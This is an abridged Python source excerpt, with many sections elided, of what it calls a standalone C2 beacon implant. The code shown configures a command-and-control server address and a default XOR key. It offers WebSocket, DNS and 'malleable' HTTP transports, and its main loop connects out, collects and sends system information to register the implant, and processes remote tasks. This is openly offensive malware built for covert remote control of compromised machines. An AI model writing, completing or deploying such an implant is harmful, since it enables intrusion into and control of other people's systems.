...
import psutil
from transport import DNSTransport, MalleableHTTPTransport, WebSocketTransport
...
class BeaconConfig:
    ...
    server_target: str = os.environ.get(
        "C2_TARGET", "ws://192.168.0.152:47431/ws/beacon"
    )
    transport_type: str = os.environ.get("C2_TRANSPORT", "websocket")
    xor_key: str = os.environ.get("C2_XOR_KEY", "c2-beacon-default-key-change-me")
...
async def handle_pwd(args: str | None) -> dict[str, Any]:
...
async def main() -> None:
    """Main beacon loop: connect, register, process tasks via selected transport layer"""
    if config.transport_type == "websocket":
        transport = WebSocketTransport(config.server_target, config.beacon_id)
    elif config.transport_type == "dns":
        transport = DNSTransport(config.server_target, config.beacon_id)
    elif config.transport_type == "malleable":
        transport = MalleableHTTPTransport(config.server_target, config.beacon_id)
    else:
    ...
    while True:
        try:
            logger.info(
                "Initializing %s transport against target: %s",
                config.transport_type,
                config.server_target,
            )

            if not transport.connect():
                raise ConnectionError("Failed to initialize transport connection.")

            # Register implant
            sysinfo = collect_system_info()
            reg_msg = pack("REGISTER", sysinfo)
            ...
            logger.warning("Connection lost or error encountered: %s", exc)
...
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Standalone C2 Beacon Implant")
    parser.add_argument(
        "--transport",
    ...
    parser.add_argument(
        ...
        help="Target C2 endpoint or domain",
    )

    args = parser.parse_args()
    config.transport_type = args.transport
    config.server_target = args.target
